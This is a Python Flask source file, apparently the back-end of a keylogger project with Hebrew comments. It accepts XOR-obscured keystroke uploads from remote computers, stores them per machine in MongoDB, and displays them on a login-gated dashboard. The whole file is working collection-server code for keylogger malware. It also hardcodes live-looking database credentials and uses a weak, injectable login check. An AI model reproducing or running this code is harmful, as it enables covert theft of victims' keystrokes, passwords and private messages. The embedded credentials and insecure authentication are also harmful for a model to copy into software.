from flask import Flask, request, render_template, redirect, url_for, jsonify
from flask_cors import CORS
from pymongo import MongoClient
from encryptor import Encryptor
from special_keys import SpecialKeys

app = Flask(__name__)
CORS(app)

class Users:

    def __init__(self):
        self.CONNECTION_STRING = "mongodb+srv://Oryan3160204:Oryan3160204@keyloggerproject.gplgc.mongodb.net/"
        self.client = MongoClient(self.CONNECTION_STRING)
        self.DB = self.client["KeyLoggerProject"]
        self.collection = self.DB["UsersDatabase"]

    def verify_user(self,user_name,password) -> bool:
        if self.collection.find_one({user_name : password}):
            return True
        return False


class App:

    def __init__(self):
        self.CONNECTION_STRING = "mongodb+srv://Oryan3160204:Oryan3160204@keyloggerproject.gplgc.mongodb.net/"
        self.client = MongoClient(self.CONNECTION_STRING)
        self.DB = self.client["KeyLoggerProject"]
        self.collection = self.DB["computers"]
        self.computer_connection = {}

    def get_computers_list(self):
        #קבלת רשימה של כל המחשבים
        computer_list =self.collection.find({},{"mac_name" : 1,"_id" : 0})
        computer_list = [computer["mac_name"] for computer in computer_list]

        #ניהול חיבור בין שם מחשב למידע
        self.computer_connection = {f"computer{i}" : computer_list[i] for i in range(len(computer_list))}

        #החזרת רשימה של כל שמות המחשבים
        return list(self.computer_connection.keys())

    def get_computer_details(self,computer_name) -> dict:
        #בדיקה האם קיים מחשב זה
        if computer_name not in self.computer_connection:
            return None
        #קבלת המידע של המחשב הזה
        data = self.collection.find_one({"mac_name" : self.computer_connection[computer_name]}, {"_id" : 0})

        #החזרת המידע
        return dict(data if data else {})

    def add_computer(self,data:dict):
        if self.collection.find_one({"mac_name" :data["mac_name"]}) is not None:
            self._update_computer_details(data)
            return

        data["data"] = [data["data"]]
        insert_id = self.collection.insert_one(data).inserted_id

        return insert_id

    def _update_computer_details(self,data:dict):
        self.collection.update_one(
            {"mac_name" : data["mac_name"]},
            {"$push" : {"data" : data["data"]}}
        )




@app.route('/')
def home():
    return render_template("home.html")

@app.route("/api/upload",methods=["POST"])
def upload():

    # קבלת הנתונים שהמחשב שלך
    data = request.get_json()

    # ניהול שגיאות
    if error_manager(data):
        return jsonify({"message": data})

    # יצירת אוביקט של הצפנה
    decryptor = Encryptor()

    # להחזיר את ההצפנה למתונים המקוריים
    data = decryptor.xor(data)

    # הוספת המחשב לDB
    manager.add_computer(data)

    # החזרת תשובה
    return jsonify({"message": "continue"})

def error_manager(data:dict) -> bool:
    #אם לא התקבל ערך
    if not data:
        return True
    return False

@app.route("/user_verification",methods= ["POST"])
def user_verification():

    #קבלת הנתונים מהform
    user_name = request.form.get("username")
    password = request.form.get("password")

    #בדיקת הנתונים מול הדאטה בייס
    response = users.verify_user(user_name,password)

    #שליחת תשובה לפרונט
    if response:
        return redirect(url_for("computers"))
    else:
        return render_template("home.html")

@app.route("/computers")
def computers():
    return render_template("computers.html")

@app.route("/computers/get_computers_list",methods=["get"])
def get_computers_list():
    #קבלת רשימת המחשבים מהדאה בייס
    list_of_computer = manager.get_computers_list()

    #החזרת המחשבים לפרונט
    return jsonify({"list_of_computer" : list_of_computer})

@app.route("/computers/<computer>",methods=["GET"])
def get_computer_details(computer):
    #קבלת הנתונים של המחשב מהמחלקה
    data = manager.get_computer_details(computer)

    if not data:
        return "ERROR:not found",404

    data["data"] = process.process_list_of_data(data["data"])

    #החזרת הדף כולל הנתונים
    return render_template("computer_information.html",
                           computer=computer,computer_data = data)


if __name__ == '__main__':
    users = Users()
    manager = App()
    process = SpecialKeys()
    app.run(debug=True)

